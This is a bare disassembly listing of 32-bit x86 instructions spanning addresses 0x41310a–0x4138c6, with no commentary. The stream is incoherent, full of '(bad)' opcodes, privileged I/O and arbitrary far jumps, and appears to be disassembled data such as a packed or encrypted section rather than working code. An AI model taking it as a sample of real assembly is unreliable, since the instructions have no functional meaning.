  41310a:	mov    WORD PTR [ecx],ss
  41310c:	test   BYTE PTR [eax+0x40e4fcc5],0xcc
  413113:	add    al,0x6d
  413115:	xor    BYTE PTR [ecx],0xf9
  413118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413119:	dec    esp
  41311a:	aaa    
  41311b:	pusha  
  41311c:	pop    edx
  41311d:	es mov ch,0xa5
  413120:	cmc    
  413121:	xchg   esp,eax
  413122:	push   ebx
  413123:	pop    ebx
  413124:	test   al,0xce
  413126:	xor    eax,0x1340afad
  41312b:	sub    al,0xca
  41312d:	jnp    0x41319c
  41312f:	fwait
  413130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413131:	pop    ebx
  413132:	dec    ecx
  413133:	pushf  
  413134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413135:	dec    ebp
  413136:	dec    esp
  413137:	mov    edx,0xc8dd0b15
  41313c:	cmc    
  41313d:	imul   ecx,DWORD PTR [ecx],0x747d8c9a
  413143:	test   BYTE PTR [ecx+0x77],bh
  413146:	mov    ch,0x47
  413148:	pop    ds
  413149:	fisttp DWORD PTR [edi+0x44ac4430]
  41314f:	lods   al,BYTE PTR ds:[esi]
  413150:	dec    eax
  413151:	add    eax,0xcd8d0eea
  413156:	inc    edx
  413157:	(bad)  
  413158:	jge    0x4130de
  41315a:	jg     0x413133
  41315c:	mov    edx,DWORD PTR [edi-0x1683da8c]
  413162:	dec    ebp
  413163:	jp     0x413154
  413165:	mov    esi,0x3a92f108
  41316a:	out    dx,eax
  41316b:	sub    ebx,ebx
  41316d:	clc    
  41316e:	fld    st(7)
  413170:	cmp    dh,dl
  413172:	hlt    
  413173:	cld    
  413174:	test   al,0xb3
  413176:	fadd   QWORD PTR ds:0xd270c69d
  41317c:	fnstsw WORD PTR [ecx+eiz*1+0x5e]
  413180:	popa   
  413181:	jp     0x4131f9
  413183:	leave  
  413184:	dec    eax
  413185:	pop    ss
  413186:	push   0xffffff8e
  413188:	xchg   edi,eax
  413189:	out    dx,eax
  41318a:	xchg   BYTE PTR [ebx-0x3a84da30],al
  413190:	icebp  
  413191:	retf   0xae2c
  413194:	add    DWORD PTR [esi],edi
  413196:	dec    eax
  413197:	mov    ds:0x23e61264,al
  41319c:	mov    bh,0x9
  41319e:	pop    esi
  41319f:	data16 scas al,BYTE PTR es:[edi]
  4131a1:	or     eax,esp
  4131a3:	cmp    BYTE PTR [ecx+0x2f],dh
  4131a6:	inc    ebp
  4131a7:	dec    ebx
  4131a8:	sbb    edx,DWORD PTR [eax+ebp*2]
  4131ab:	mov    edx,DWORD PTR [esi+0x76c738ba]
  4131b1:	loop   0x413213
  4131b3:	sub    eax,0xa7761da4
  4131b8:	loopne 0x413187
  4131ba:	mov    bp,0x43ba
  4131be:	ss ds (bad) 
  4131c1:	pop    ebx
  4131c2:	jno    0x4131e2
  4131c4:	or     al,0xb
  4131c6:	fisubr DWORD PTR [edi]
  4131c8:	mov    bh,0xa2
  4131ca:	stc    
  4131cb:	xor    al,0x93
  4131cd:	mov    WORD PTR [esi+0x2a],gs
  4131d0:	and    ecx,DWORD PTR [ecx]
  4131d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131d3:	cs pusha 
  4131d5:	iret   
  4131d6:	loop   0x4131d8
  4131d8:	stos   BYTE PTR es:[edi],al
  4131d9:	shl    dh,1
  4131db:	clc    
  4131dc:	stos   BYTE PTR es:[edi],al
  4131dd:	cmp    eax,0xd62786b0
  4131e2:	jno    0x4131eb
  4131e4:	sbb    DWORD PTR [esi],0x7e
  4131e7:	retf   
  4131e8:	enter  0xf2b4,0x3b
  4131ec:	dec    ebx
  4131ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131ee:	dec    esp
  4131ef:	popa   
  4131f0:	and    al,0x43
  4131f2:	rcr    cl,1
  4131f4:	sbb    DWORD PTR [edi-0x75f3e82b],0x2b3d6933
  4131fe:	mov    ecx,0xa3df3bf1
  413203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413204:	add    bh,BYTE PTR [esi-0x21]
  413207:	les    edx,FWORD PTR [eax+eax*1+0x712b1de2]
  41320e:	inc    ebx
  41320f:	and    DWORD PTR [ecx],esp
  413211:	js     0x4131b8
  413213:	push   edx
  413214:	sbb    bl,dl
  413216:	push   DWORD PTR [edx+0x42]
  413219:	daa    
  41321a:	or     ecx,DWORD PTR [ecx]
  41321c:	in     al,dx
  41321d:	shl    BYTE PTR [esi+esi*4],cl
  413220:	shl    edi,cl
  413222:	int    0x50
  413224:	rcr    BYTE PTR [eax+0x0],1
  413227:	push   ds
  413228:	jbe    0x4131f4
  41322a:	(bad)
  41322e:	adc    esi,DWORD PTR [eax+ecx*8]
  413231:	and    ch,BYTE PTR [esi+0x54]
  413234:	pop    ebp
  413235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413236:	test   DWORD PTR [edi],ebp
  413238:	jge    0x413214
  41323a:	aaa    
  41323b:	and    ebx,DWORD PTR [ebp-0x318f5a74]
  413241:	mov    al,ds:0xc68be8d9
  413246:	clc    
  413247:	fucomp st(4)
  413249:	jbe    0x413244
  41324b:	push   cs
  41324c:	mov    ds:0x395aaf1d,eax
  413251:	cmp    al,0xb
  413253:	pop    edx
  413254:	push   ss
  413255:	inc    eax
  413256:	add    cl,dh
  413258:	jecxz  0x41320d
  41325a:	xor    bh,bh
  41325c:	dec    ebx
  41325d:	mov    bh,0x26
  41325f:	dec    ebp
  413260:	sbb    DWORD PTR [eax],edx
  413262:	push   esp
  413263:	aam    0x1b
  413265:	repz mov ds:0xc002cf10,eax
  41326b:	xchg   DWORD PTR [esi+0x7d],esi
  41326e:	push   ds
  41326f:	push   eax
  413270:	rcr    BYTE PTR [ebx+eax*2+0x2c],cl
  413274:	sbb    al,BYTE PTR [ebp+eiz*1+0x9f5ad41]
  41327b:	push   edx
  41327c:	(bad)
  41327f:	cmp    al,0x38
  413281:	lahf   
  413282:	les    edi,FWORD PTR [edx]
  413284:	mov    ?,WORD PTR [ecx+0x4a410efa]
  41328a:	lea    esi,[edi-0x26450be8]
  413290:	mov    dl,0xc2
  413292:	shl    BYTE PTR [edx],0x47
  413295:	pop    esp
  413297:	ret    0xfd29
  41329a:	daa    
  41329b:	lods   al,BYTE PTR fs:[esi]
  41329d:	mov    es,ebx
  41329f:	sar    BYTE PTR [ebx+0x5b],cl
  4132a2:	mov    ch,0x17
  4132a4:	jmp    0x4132c1
  4132a6:	add    edi,eax
  4132a8:	xor    DWORD PTR [ebx+0x2a],ebp
  4132ab:	and    DWORD PTR [edi-0x790da68d],0xe9843c20
  4132b5:	cmp    cl,0x84
  4132b8:	fbld   TBYTE PTR [esi+0x3c353b53]
  4132be:	neg    BYTE PTR [ebp+0x60]
  4132c1:	mov    ds:0x889c34f8,eax
  4132c6:	xchg   esi,eax
  4132c7:	cmp    DWORD PTR [edi+0xb],0xab0e5513
  4132ce:	cmp    bl,BYTE PTR [eax-0x77]
  4132d1:	mov    ds:0xb588af13,eax
  4132d6:	jo     0x413354
  4132d8:	stc    
  4132d9:	jne    0x4132c5
  4132db:	inc    ecx
  4132dc:	scas   al,BYTE PTR es:[edi]
  4132dd:	pop    esp
  4132de:	xchg   esi,eax
  4132df:	cmp    eax,0x3a05d2b4
  4132e4:	int3   
  4132e5:	mov    ds:0x4e5f48b2,eax
  4132ea:	lods   eax,DWORD PTR ds:[esi]
  4132eb:	sub    ch,BYTE PTR [edx+edi*4+0x7ebacc17]
  4132f2:	cdq    
  4132f3:	loop   0x413371
  4132f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132f6:	mov    edi,0xc0eed838
  4132fb:	inc    esp
  4132fc:	push   esi
  4132fd:	push   0xbf950418
  413302:	mov    dh,BYTE PTR [ebx+0x22ed45c9]
  413308:	jmp    FWORD PTR [esi]
  41330a:	inc    edi
  41330b:	inc    ebx
  41330c:	adc    eax,0xeec4691b
  413311:	add    dl,bl
  413313:	cld    
  413314:	shl    DWORD PTR [ebp+ebp*1+0x53],cl
  413318:	push   ecx
  413319:	popf   
  41331a:	jle    0x413322
  41331c:	rol    DWORD PTR [ebx+0x36],0x34
  413320:	shl    BYTE PTR [eax],cl
  413322:	fs xor eax,0x69b0289e
  413328:	stc    
  413329:	dec    ebx
  41332a:	hlt    
  41332b:	sbb    al,0x93
  41332d:	inc    edi
  41332e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41332f:	mov    ds:0x69325162,eax
  413334:	hlt    
  413335:	sbb    ch,al
  413337:	(bad)  
  413338:	push   0xc49a7d15
  41333d:	lods   eax,DWORD PTR ds:[esi]
  41333e:	push   ds
  41333f:	test   eax,0x7a9b9714
  413344:	mov    al,0x5e
  413346:	ja     0x4132f2
  413348:	loope  0x413308
  41334a:	xlat   BYTE PTR ds:[ebx]
  41334b:	sbb    bh,BYTE PTR [edx+0x57]
  41334e:	mov    edx,DWORD PTR [eax-0x525bc9c8]
  413354:	cwde   
  413355:	jno    0x4133ac
  413357:	ins    DWORD PTR es:[edi],dx
  413358:	add    ebx,DWORD PTR [ecx-0xd85371b]
  41335e:	mov    eax,ds:0x3079ac92
  413363:	push   ecx
  413364:	cmp    ecx,DWORD PTR [eax+0x1f]
  413367:	call   0x1a62:0x64d7bab
  41336e:	bnd jb 0x41331a
  413371:	mov    eax,0x4b81a302
  413376:	mov    ah,0xfd
  413378:	or     al,0x5d
  41337a:	xchg   ebp,eax
  41337b:	(bad)  
  41337c:	sbb    eax,0x433d23bc
  413381:	aas    
  413382:	out    dx,al
  413383:	mov    cl,dh
  413385:	repnz fidiv DWORD PTR [eax+0xdcafe5c]
  41338c:	fsubr  DWORD PTR [ecx+edi*2]
  41338f:	imul   esi,DWORD PTR [edi-0x33],0xffffffa0
  413393:	shl    DWORD PTR [edx-0x3b],1
  413396:	mov    al,ds:0xb4247f60
  41339b:	sbb    eax,0xa90637fe
  4133a0:	or     al,0xc0
  4133a2:	pop    edi
  4133a3:	outs   dx,DWORD PTR ds:[esi]
  4133a4:	test   esp,edi
  4133a6:	shl    DWORD PTR [ecx-0x57f31062],cl
  4133ac:	es in  al,dx
  4133ae:	mov    al,ds:0x606a6586
  4133b3:	mov    bh,BYTE PTR [ecx-0x4c]
  4133b6:	cmc    
  4133b7:	inc    edi
  4133b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133b9:	dec    ebp
  4133ba:	retf   
  4133bb:	xor    DWORD PTR [ecx-0x28],edi
  4133be:	les    edx,FWORD PTR [ecx]
  4133c0:	addr16 icebp 
  4133c2:	mov    ebx,0x19601035
  4133c7:	ins    DWORD PTR es:[edi],dx
  4133c8:	push   ss
  4133c9:	leave  
  4133ca:	imul   edx,DWORD PTR [edx-0x52],0xc33d079c
  4133d1:	call   0xe34986fe
  4133d6:	mov    cl,0x20
  4133d8:	jecxz  0x4133d5
  4133da:	mov    ds:0x9fc96df7,eax
  4133df:	jle    0x413412
  4133e1:	imul   edi,eax,0xc7455862
  4133e7:	(bad)  
  4133e8:	mov    ah,0x1
  4133ea:	adc    al,0x81
  4133ec:	jp     0x41342e
  4133ee:	add    BYTE PTR ds:0xede0e97e,bh
  4133f4:	test   eax,0xc9be16d5
  4133f9:	push   esp
  4133fa:	scas   al,BYTE PTR es:[edi]
  4133fb:	push   edx
  4133fc:	jns    0x413453
  4133fe:	mov    ebp,DWORD PTR [edx-0x1ed82881]
  413404:	stos   DWORD PTR es:[edi],eax
  413405:	mov    ss,WORD PTR [eax-0x101acde3]
  41340b:	ret    0xc716
  41340e:	jbe    0x4133fd
  413410:	inc    esi
  413411:	pushf  
  413412:	ret    
  413413:	clc    
  413414:	mov    dl,0xd3
  413416:	xor    eax,0x87978d79
  41341b:	pop    ecx
  41341c:	retf   
  41341d:	bound  ebx,QWORD PTR [esi]
  41341f:	mov    cl,0x26
  413421:	mov    ebp,0x27ec9d35
  413426:	mov    dl,0x12
  413428:	enter  0x8a5d,0x45
  41342c:	and    BYTE PTR [edx],0x74
  41342f:	jmp    0xd2132899
  413434:	adc    DWORD PTR [eax-0x40],ebx
  413437:	mov    ch,0xf7
  413439:	clc    
  41343a:	or     edi,0xa08f0f4b
  413440:	or     al,0xa9
  413442:	sahf   
  413443:	mov    ch,0xd
  413445:	mov    eax,ds:0x361f30d7
  41344a:	cmc    
  41344b:	test   eax,0x23f2f2a9
  413450:	mov    al,0x31
  413452:	in     eax,0x9c
  413454:	ds scas eax,DWORD PTR es:[edi]
  413456:	std    
  413457:	adc    al,ch
  413459:	sbb    eax,0x225179b8
  41345e:	mov    ch,BYTE PTR gs:[edi]
  413461:	(bad)  
  413462:	xor    ecx,DWORD PTR [ecx+0x69ffc126]
  413468:	push   ecx
  413469:	and    DWORD PTR ds:0x48651d46,ecx
  41346f:	sub    ecx,DWORD PTR [eax+0x68]
  413472:	jns    0x4134be
  413474:	or     ah,BYTE PTR [eax]
  413476:	pop    esi
  413477:	inc    ebp
  413478:	scas   eax,DWORD PTR es:[edi]
  413479:	iret   
  41347a:	fsubr  DWORD PTR [edx+0x15caf912]
  413480:	pop    ecx
  413481:	retf   
  413482:	mov    ds:0x83e08bfb,eax
  413487:	add    ebp,DWORD PTR [esi-0x21]
  41348a:	sbb    ah,BYTE PTR [ecx]
  41348c:	jecxz  0x4134ba
  41348e:	dec    esi
  41348f:	jno    0x41341c
  413491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413492:	mov    al,ah
  413494:	lds    ebx,FWORD PTR [ebx-0x2f2b67a9]
  41349a:	sbb    ah,dl
  41349c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41349d:	adc    BYTE PTR [ebx+0x2e2164a1],cl
  4134a3:	mov    ebx,DWORD PTR ds:0xc5532eb1
  4134a9:	mov    bh,0x6f
  4134ab:	daa    
  4134ac:	jg     0x4134a6
  4134ae:	pop    ss
  4134af:	mov    cs,WORD PTR [ebp+0x336769d8]
  4134b5:	jnp    0x4134d3
  4134b7:	xlat   BYTE PTR ds:[ebx]
  4134b8:	jne    0x413454
  4134ba:	daa    
  4134bb:	xor    BYTE PTR [ecx-0x1a],bh
  4134be:	or     al,0x8d
  4134c0:	in     eax,dx
  4134c1:	adc    BYTE PTR [edx-0x6a8271c9],bh
  4134c7:	sbb    eax,0x239dacc5
  4134cc:	mov    ebp,0x7452b97c
  4134d1:	jne    0x4134cf
  4134d3:	fwait
  4134d4:	mov    dl,0xd3
  4134d6:	into   
  4134d7:	mov    esi,0x54e4beaf
  4134dc:	in     al,dx
  4134dd:	fld    QWORD PTR [edx-0x563641e3]
  4134e3:	fucomi st,st(3)
  4134e5:	mov    ds:0xce4dbef2,eax
  4134ea:	xchg   ebx,eax
  4134eb:	jl     0x4134c8
  4134ed:	cld    
  4134ee:	push   edi
  4134ef:	pop    ecx
  4134f0:	jb     0x4134a5
  4134f2:	nop
  4134f3:	push   es
  4134f4:	push   ss
  4134f5:	pop    es
  4134f6:	mov    edx,0xa6cd60e6
  4134fb:	lea    eax,[edx-0x1a806901]
  413501:	push   edi
  413502:	test   eax,0xd1c6169b
  413507:	stc    
  413508:	mov    al,ds:0x349caad2
  41350d:	xchg   esi,eax
  41350e:	inc    edx
  41350f:	push   ebp
  413510:	lahf   
  413511:	and    dh,ch
  413513:	xor    dh,ch
  413515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413516:	fnsave [esi+edx*2-0x33]
  41351a:	pusha  
  41351b:	aas    
  41351c:	add    BYTE PTR [esp+ebx*8-0x38],bh
  413520:	(bad)  
  413521:	sub    al,0x40
  413523:	clc    
  413524:	fnstenv [ebx]
  413526:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413527:	pop    es
  413528:	shl    DWORD PTR [eax+eax*1],cl
  41352b:	xchg   edx,eax
  41352c:	enter  0x1048,0xbd
  413530:	xlat   BYTE PTR ds:[ebx]
  413531:	cdq    
  413532:	or     al,dh
  413534:	(bad)  
  413535:	std    
  413536:	int3   
  413537:	sbb    DWORD PTR [edx],esp
  413539:	pushf  
  41353a:	add    DWORD PTR [ecx+0x37c6aae3],esi
  413540:	stos   BYTE PTR es:[edi],al
  413541:	inc    edi
  413542:	nop
  413543:	mov    bl,0x66
  413545:	cmp    BYTE PTR [eax],ch
  413547:	je     0x413574
  413549:	xchg   esp,eax
  41354a:	pushf  
  41354b:	enter  0x92f2,0x2f
  41354f:	mov    bl,0x52
  413551:	push   ds
  413552:	lock pusha 
  413554:	pushf  
  413555:	and    DWORD PTR [edi-0x479f46b4],edx
  41355b:	gs adc BYTE PTR ds:[edi],dh
  41355f:	in     al,dx
  413560:	push   0xe
  413562:	fisttp DWORD PTR [edx+0x5a2dab53]
  413568:	sbb    DWORD PTR [ebx],esp
  41356a:	push   ebp
  41356b:	ror    BYTE PTR [esi+0x5d],1
  41356e:	retf   
  41356f:	dec    ebx
  413570:	pop    edx
  413571:	xchg   ebp,eax
  413572:	xchg   BYTE PTR [ebx+edi*1+0x3c933cb5],dh
  413579:	jb     0x4135b6
  41357b:	mov    ecx,0x2d6a40e5
  413580:	dec    esi
  413581:	sti    
  413582:	retf   
  413583:	hlt    
  413584:	in     eax,0x99
  413586:	aas    
  413587:	push   ecx
  413588:	ret    0xad6f
  41358b:	lods   eax,DWORD PTR ds:[esi]
  41358c:	mov    ch,0xeb
  41358e:	inc    ebx
  41358f:	push   ebx
  413590:	jmp    0xc7ab32dd
  413595:	mov    esi,0x8af4bd29
  41359a:	inc    ebx
  41359b:	mov    al,ds:0x468a99a0
  4135a0:	enter  0x8dfc,0x8e
  4135a4:	cdq    
  4135a5:	inc    ecx
  4135a6:	jno    0x41355c
  4135a8:	push   ds
  4135a9:	xchg   cl,bl
  4135ab:	push   ds
  4135ac:	xchg   ebx,eax
  4135ad:	or     al,BYTE PTR [ebx-0x333372d9]
  4135b3:	mov    ds,WORD PTR [eax]
  4135b5:	fisub  DWORD PTR [ebx]
  4135b7:	(bad)  
  4135b8:	dec    ebp
  4135b9:	into   
  4135ba:	xor    eax,0x8bb6b046
  4135bf:	mov    edx,0xaeec31bd
  4135c4:	les    edx,FWORD PTR [edi]
  4135c6:	stos   BYTE PTR es:[edi],al
  4135c7:	pusha  
  4135c8:	mov    sp,0x1116
  4135cc:	and    DWORD PTR [ecx-0x22],ecx
  4135cf:	mov    BYTE PTR [ebx],0xc9
  4135d2:	mov    esp,0x6c0f9985
  4135d7:	jmp    0x89ec:0xc3117ce6
  4135de:	sar    DWORD PTR [edx-0x35],cl
  4135e1:	aad    0x7
  4135e3:	in     eax,0x59
  4135e5:	mov    edi,0x9768ff69
  4135ea:	repz mov bl,0xf5
  4135ed:	and    bl,al
  4135ef:	mov    eax,0xcb2bea81
  4135f4:	mov    gs,WORD PTR [eax]
  4135f6:	push   cs
  4135f7:	adc    BYTE PTR [edx+0x73],dh
  4135fa:	jne    0x4135c2
  4135fc:	in     eax,dx
  4135fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135fe:	inc    ebx
  4135ff:	cmp    ah,ah
  413601:	mov    ds:0x11497037,eax
  413606:	(bad)  
  41360a:	lods   al,BYTE PTR ds:[esi]
  41360b:	pop    DWORD PTR [esi+0x213db113]
  413611:	xchg   edi,eax
  413612:	and    ebp,DWORD PTR [esi-0xf0cc080]
  413618:	sbb    eax,0x871b299
  41361d:	lods   al,BYTE PTR ds:[esi]
  41361e:	aam    0x93
  413620:	(bad)
  413623:	and    al,0x87
  413625:	in     al,0xf6
  413627:	aad    0xbf
  413629:	rol    ah,1
  41362b:	sbb    ebp,DWORD PTR [eax]
  41362d:	inc    esi
  41362e:	dec    esi
  41362f:	add    bh,dl
  413631:	mov    edi,0x644efe62
  413636:	mov    ebx,0x704482a9
  41363b:	mov    es,WORD PTR [ecx+0x12352b29]
  413641:	daa    
  413642:	stos   DWORD PTR es:[edi],eax
  413643:	ror    DWORD PTR [edi],cl
  413645:	popf   
  413646:	fcmovne st,st(5)
  413648:	mov    edi,0x5479e588
  41364d:	or     ebp,DWORD PTR [ebx+0x70]
  413650:	(bad)  
  413651:	fsincos 
  413653:	sbb    BYTE PTR [esi+edx*1],cl
  413656:	gs cld 
  413658:	xor    bl,dh
  41365a:	loope  0x41360f
  41365c:	sbb    DWORD PTR ds:0x298ffb36,eax
  413662:	push   ds
  413663:	xchg   esp,eax
  413664:	mov    ecx,0xbe822571
  413669:	and    edi,edx
  41366b:	adc    al,0xfc
  41366d:	push   ebp
  41366e:	shl    DWORD PTR [eax-0x64],1
  413671:	ins    BYTE PTR es:[edi],dx
  413672:	stc    
  413673:	fidivr WORD PTR [eax+0x21180cd6]
  413679:	(bad)  
  41367a:	mov    ecx,0xd0bf7511
  41367f:	mov    eax,0xd6fcfd36
  413684:	xor    BYTE PTR [ecx+0x2],bh
  413687:	popf   
  413688:	arpl   WORD PTR [eax+0x55762904],bx
  41368e:	mov    dl,0x68
  413690:	push   esp
  413691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413692:	cdq    
  413693:	jo     0x413697
  413695:	ja     0x4136a2
  413697:	add    DWORD PTR [esi+0x24],0xef6e33eb
  41369e:	adc    DWORD PTR [edx+0x6c],ebx
  4136a1:	fidivr DWORD PTR [edx-0x3d]
  4136a4:	xchg   ah,bl
  4136a6:	daa    
  4136a7:	(bad)  
  4136a8:	jmp    0x52be:0xe474bc51
  4136af:	(bad)  
  4136b0:	xor    eax,0x41e1f17c
  4136b5:	fld    DWORD PTR [esi+0x66]
  4136b8:	xchg   BYTE PTR [eax+0x32],ch
  4136bb:	in     al,dx
  4136bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136bd:	cmp    bl,BYTE PTR [esi+0x5d4e18f4]
  4136c3:	inc    esp
  4136c4:	ret    
  4136c5:	sub    esp,eax
  4136c7:	mov    bl,0x3c
  4136c9:	adc    al,0xac
  4136cb:	pop    ds
  4136cc:	sub    eax,0x54db55ec
  4136d1:	sub    eax,0x90b266c6
  4136d6:	xchg   ebp,eax
  4136d7:	jle    0x413698
  4136d9:	or     eax,0x1ebce5f8
  4136de:	aam    0x2a
  4136e0:	gs xchg ebp,esi
  4136e3:	fldcw  WORD PTR [eax-0x1c]
  4136e6:	jb     0x413733
  4136e8:	mov    ds:0xfb3ed224,eax
  4136ed:	imul   edi,DWORD PTR [ebp-0x444b499a],0x44
  4136f4:	stc    
  4136f5:	pushf  
  4136f6:	mov    cl,0xeb
  4136f8:	xchg   ecx,eax
  4136f9:	dec    edx
  4136fa:	mov    al,ds:0xdca01f07
  4136ff:	out    dx,al
  413700:	icebp  
  413701:	add    BYTE PTR [eax+0x40],cl
  413704:	jo     0x41368e
  413706:	das    
  413707:	add    eax,0x2588b742
  41370c:	aaa    
  41370d:	xlat   BYTE PTR ds:[ebx]
  41370e:	adc    al,BYTE PTR [ecx+edi*2]
  413711:	stos   BYTE PTR es:[edi],al
  413712:	aad    0xb4
  413714:	and    BYTE PTR [eax],al
  413716:	sbb    DWORD PTR [edx+0x3b8df736],esp
  41371c:	inc    ebp
  41371d:	inc    esi
  41371e:	bound  eax,QWORD PTR [edx-0x73]
  413721:	int3   
  413722:	(bad)  
  413723:	ret    0x2a81
  413726:	fldenv [ecx*4+0x43f557cb]
  41372d:	stos   BYTE PTR es:[edi],al
  41372e:	popf   
  41372f:	idiv   BYTE PTR [ecx+0x31]
  413732:	(bad)  
  413733:	or     eax,0xe5a9320b
  413738:	jmp    0x413763
  41373a:	shl    DWORD PTR fs:[eax+0x167b10b2],1
  413741:	clc    
  413742:	fsub   DWORD PTR [eax+0x3e]
  413745:	mov    DWORD PTR [eax+0x13],ecx
  413748:	jg     0x41376b
  41374a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41374b:	outs   dx,DWORD PTR ds:[esi]
  41374c:	mov    ebx,0xc7ac5cad
  413751:	push   edx
  413752:	rol    DWORD PTR [eax+0x2b],cl
  413755:	data16 int3 
  413757:	jae    0x4137c1
  413759:	xchg   BYTE PTR [bx+si+0x78],bl
  41375d:	inc    edx
  41375e:	shl    BYTE PTR [edx+0x366c0cd7],cl
  413764:	call   0x424ac86d
  413769:	xchg   ebp,eax
  41376a:	scas   al,BYTE PTR es:[edi]
  41376b:	sbb    DWORD PTR [edx],0x50
  41376e:	pop    ds
  41376f:	sub    ch,BYTE PTR [eax]
  413771:	shr    dh,0xfe
  413774:	mov    al,ds:0x7ed99782
  413779:	add    esi,DWORD PTR [esi]
  41377b:	test   al,0x8d
  41377d:	out    dx,eax
  41377e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41377f:	stos   DWORD PTR es:[edi],eax
  413780:	lods   al,BYTE PTR ds:[esi]
  413781:	cdq    
  413782:	lock sti 
  413784:	ds leave 
  413786:	data16 aad 0x6
  413789:	push   0x20
  41378b:	mov    ecx,0x7c486f4b
  413790:	mov    esi,0x52ce6efc
  413795:	xor    dl,0x11
  413798:	jge    0x4137cb
  41379a:	test   eax,0x36e2ad98
  41379f:	hlt    
  4137a0:	cs scas al,BYTE PTR es:[edi]
  4137a2:	sahf   
  4137a3:	adc    BYTE PTR [edx+0x3f01db5a],bh
  4137a9:	push   ebx
  4137aa:	ret    
  4137ab:	inc    esp
  4137ac:	in     eax,dx
  4137ad:	mov    ds:0x4e61505a,al
  4137b2:	leave  
  4137b3:	outs   dx,DWORD PTR ds:[esi]
  4137b4:	shl    BYTE PTR [edx+0x8],cl
  4137b7:	xor    eax,0x62cee0d9
  4137bc:	or     BYTE PTR [edx-0x5633512d],dl
  4137c2:	es push edi
  4137c4:	retf   
  4137c5:	sub    eax,0xac720537
  4137ca:	cmc    
  4137cb:	mov    BYTE PTR [esp+ebx*8+0x78],ah
  4137cf:	inc    edx
  4137d0:	jmp    0x4137e1
  4137d2:	in     al,0xab
  4137d4:	shl    BYTE PTR [edi-0x7ece9b64],1
  4137da:	xchg   edi,eax
  4137db:	data16 (bad) 
  4137dd:	pop    ds
  4137de:	aaa    
  4137df:	xchg   DWORD PTR [edi],edx
  4137e1:	popa   
  4137e2:	and    DWORD PTR [edx+esi*4],ebp
  4137e5:	inc    esp
  4137e6:	xlat   BYTE PTR ds:[ebx]
  4137e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137e8:	cmp    BYTE PTR [edx+eax*1+0x61cac640],cl
  4137ef:	sub    DWORD PTR [edx],esi
  4137f1:	or     ebx,DWORD PTR [ebx+eax*8]
  4137f4:	psrld  mm6,QWORD PTR [esi]
  4137f7:	push   ss
  4137f8:	jle    0x4137f7
  4137fa:	stc    
  4137fb:	jp     0x413832
  4137fd:	es retf 
  4137ff:	cwde   
  413800:	mov    ebx,0x53965cdf
  413805:	in     eax,0x66
  413807:	and    BYTE PTR [edx],0x6f
  41380a:	test   ebx,eax
  41380c:	out    0xd3,al
  41380e:	test   al,0xc
  413810:	jns    0x413886
  413812:	lahf   
  413813:	xchg   ebp,eax
  413814:	rcr    BYTE PTR [edi],0x1
  413817:	loop   0x413872
  413819:	iret   
  41381a:	pop    ecx
  41381b:	repz push eax
  41381d:	push   ebp
  41381e:	xchg   esi,eax
  41381f:	mov    bl,0xb9
  413821:	sar    ecx,1
  413823:	push   ebx
  413824:	leave  
  413825:	dec    esp
  413826:	xchg   edi,eax
  413827:	lahf   
  413828:	repnz inc DWORD PTR [ebp-0x2a]
  41382c:	loopne 0x413814
  41382e:	xchg   ebx,eax
  41382f:	mov    BYTE PTR [edi+0x44],bl
  413832:	test   al,0x59
  413834:	bound  esi,QWORD PTR [ecx+0x52239eee]
  41383a:	ficomp WORD PTR [esi]
  41383c:	fidiv  WORD PTR [eax]
  41383e:	add    DWORD PTR [esi],esi
  413840:	xchg   BYTE PTR [ecx+0x2],al
  413843:	sub    dh,BYTE PTR [edi]
  413845:	call   DWORD PTR [edx]
  413847:	cmp    eax,0xc6c1a18
  41384c:	and    DWORD PTR [ebx-0x417eaa8a],0x74
  413853:	lds    esi,FWORD PTR [eax+0x54]
  413856:	(bad)  
  413857:	in     al,dx
  413858:	or     al,0xd3
  41385a:	dec    esp
  41385b:	adc    dl,ah
  41385d:	lock mov ecx,0x804adbc2
  413863:	xchg   ecx,eax
  413864:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413865:	psubusb mm3,QWORD PTR [esi]
  413868:	sahf   
  413869:	sub    bh,BYTE PTR [esp+esi*1+0x428c6949]
  413870:	cdq    
  413871:	int    0x26
  413873:	mov    dh,dl
  413875:	test   BYTE PTR [ecx],ah
  413877:	fimul  DWORD PTR [edi+edx*4-0x42de2b4f]
  41387e:	sbb    BYTE PTR [esi-0x2175345],dl
  413884:	int3   
  413885:	pushf  
  413886:	cli    
  413887:	imul   esi,DWORD PTR [edi],0xc7aa4eaa
  41388d:	iret   
  41388e:	mov    dl,0xf
  413890:	sbb    BYTE PTR [edx],cl
  413892:	mov    ds:0xa4ea2878,eax
  413897:	(bad)  
  413898:	jmp    0x25365dc2
  41389d:	hlt    
  41389e:	jo     0x41389d
  4138a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138a1:	fistp  QWORD PTR [ebp+0x37f5ad0d]
  4138a7:	test   DWORD PTR [ebp-0xa],ecx
  4138aa:	sbb    eax,0xc6047dda
  4138af:	mov    ds,WORD PTR [edi+0x12]
  4138b2:	(bad)  
  4138b3:	icebp  
  4138b4:	call   0xd7ce8311
  4138b9:	xor    ch,BYTE PTR [edx+0x29ebf1ed]
  4138bf:	pop    eax
  4138c0:	aaa    
  4138c1:	stc    
  4138c2:	sbb    esp,DWORD PTR [ebx+0x13]
  4138c5:	hlt    
  4138c6:	push   esp
